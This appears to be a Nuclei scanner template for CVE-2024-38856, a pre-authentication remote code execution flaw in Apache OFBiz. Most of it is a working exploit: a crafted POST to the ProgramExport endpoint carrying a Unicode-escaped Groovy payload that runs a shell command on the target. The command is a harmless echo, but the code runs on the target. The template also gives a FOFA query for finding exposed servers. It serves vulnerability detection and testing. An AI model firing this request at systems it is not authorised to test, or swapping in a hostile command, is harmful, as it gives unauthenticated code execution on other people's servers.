id: CVE-2024-38856
info:
  name: Apache OFBiz - Remote Code Execution (Unauthenticated)
  author: Ayu
  severity: Critical
  description: CVE-2024-38856 is a recently disclosed critical (CVSS score 9.8) pre-authentication remote code execution vulnerability affecting Apache OFBiz versions up to 18.12.14. Once exploited it allows unauthenticated attackers with remote code execution via crafted requests.
  metadata:
    fofa-query:
      - app="Apache_OFBiz"
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-38856
    - https://www.zscaler.com/blogs/security-research/cve-2024-38856-pre-auth-rce-vulnerability-apache-ofbiz
  tags: rce, cve, 2024

variables:
  # throw new Exception('echo "[PWN]"'.execute().text);
  payload: "\u0074\u0068\u0072\u006F\u0077\u0020\u006E\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006F\u006E\u0028\u0027\u0065\u0063\u0068\u006F\u0020\u0022\u005B\u0050\u0057\u004E\u005D\u0022\u0027\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002E\u0074\u0065\u0078\u0074\u0029\u003B"

http:
  - raw:
      - |
        POST /webtools/control/main/ProgramExport HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:122.0) Gecko/20000101 Firefox/123.0
        Content-Type: application/x-www-form-urlencoded

        groovyProgram={{payload}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'contains(body, "[PWN]")'
          - 'contains(body, "java.lang.Exception")'
        condition: and
